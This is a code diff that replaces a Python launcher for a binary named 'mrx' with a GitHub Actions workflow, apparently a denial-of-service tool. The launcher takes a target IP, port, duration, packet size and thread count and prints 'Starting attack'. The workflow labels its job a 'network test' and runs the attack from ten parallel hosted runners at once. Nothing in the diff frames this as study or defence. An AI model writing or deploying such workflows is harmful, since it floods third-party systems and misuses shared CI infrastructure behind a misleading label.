@@ -1,22 +1,38 @@
-import subprocess
-import sys
-import os
+name: "MRX Project"
+on:
+  workflow_dispatch:
+    inputs:
+      ip:
+        description: "Target IP"
+        required: true
+        type: string
+      port:
+        description: "Target Port" 
+        required: true
+        type: string
+      duration:
+        description: "Attack Duration"
+        required: true
+        type: string
+      packet_size:
+        description: "Packet Size"
+        required: true
+        type: string
+      threads:
+        description: "Connection Threads"
+        required: true
+        type: string
 
-def main():
-    if len(sys.argv) != 6:
-        print("Usage: python3 main.py <ip> <port> <time> <packet_size> <threads>")
-        sys.exit(1)
-    
-    ip, port, duration, size, threads = sys.argv[1:6]
-    
-    if os.path.exists("mrx"):
-        os.chmod("mrx", 0o755)
-    
-    print(f"Starting attack on {ip}:{port}")
-    
-    result = subprocess.run(f"./mrx {ip} {port} {duration} {size} {threads}", shell=True)
-    
-    print(f"Attack finished")
-
-if __name__ == "__main__":
-    main()
+jobs:
+  network-test:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        worker: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v3
+    - name: Make binary executable  
+      run: chmod +x mrx
+    - name: Run Network Test
+      run: python3 main.py ${{ inputs.ip }} ${{ inputs.port }} ${{ inputs.duration }} ${{ inputs.packet_size }} ${{ inputs.threads }}
